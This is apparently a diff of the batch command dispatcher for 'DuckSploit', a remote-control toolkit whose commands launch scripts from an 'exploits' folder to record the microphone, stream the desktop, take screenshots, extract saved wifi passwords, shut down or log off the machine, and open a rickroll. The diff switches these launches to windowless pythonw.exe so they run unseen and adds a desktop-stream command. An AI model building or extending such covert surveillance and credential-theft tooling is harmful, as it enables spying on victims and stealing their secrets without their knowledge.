@@ -117,23 +117,20 @@ start chrome.exe http://%ip%:8013
 
 IF (%~1) == (recordmicro) (
     IF "%arg2%" == "" (echo [x] Usage: ds recordmicro 'time in second') else (
-    python C:\DuckSploit\scripts\exploits\record_micro.py %arg2%
+    start pythonw.exe C:\DuckSploit\scripts\exploits\record_micro.py %arg2%
     )
 )
 
-IF (%~1) == (recordscreen) (
-    IF "%arg2%" == "" (echo [x] Usage: ds recordscreen 'time in second') else (
-    python C:\DuckSploit\scripts\exploits\record_screen.py %arg2%
-    )
+IF (%~1) == (desktopstream) (
+start pythonw.exe C:\DuckSploit\scripts\exploits\desktop_stream.py 
 )
 
 IF (%~1) == (getwifipwd) (
-python C:\DuckSploit\scripts\exploits\getwifipwd.py
+start pythonw.exe C:\DuckSploit\scripts\exploits\getwifipwd.py
 )
 
 
 IF (%~1) == (talk) (
-taskkill /IM pythonw.exe /F
 start pythonw.exe C:\DuckSploit\scripts\exploits\chat\server.py
 start python.exe C:\DuckSploit\scripts\exploits\chat\clientnoname.py %ip% %username%
 echo [o] Connect to the chat with 'ds clientchat %ip%' in a new command prompt
@@ -153,15 +150,15 @@ start cmd.exe /k call C:\DuckSploit\scripts\exploits\batch\skull.cmd
 )
 
 IF (%~1) == (screenshot) (
-python C:\DuckSPloit\scripts\exploits\screenshot.py
+start pythonw.exe C:\DuckSPloit\scripts\exploits\screenshot.py
 )
 
 IF (%~1) == (host) (
-start python.exe C:\$DuckSploitw\host.py
+start pythonw.exe C:\$DuckSploitw\host.py
 )
 
 IF (%~1) == (reload) (
-start python.exe C:\DuckSploit\client.py
+start pythonw.exe C:\DuckSploit\client.py
 )
 
 IF (%~1) == (reboot) (
@@ -174,6 +171,12 @@ shutdown -S
 
 IF (%~1) == (closesession) (
 shutdown -L
+)
+
+IF (%~1) == (rickroll) (
+echo on
+start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ
+echo off
 )
 
 
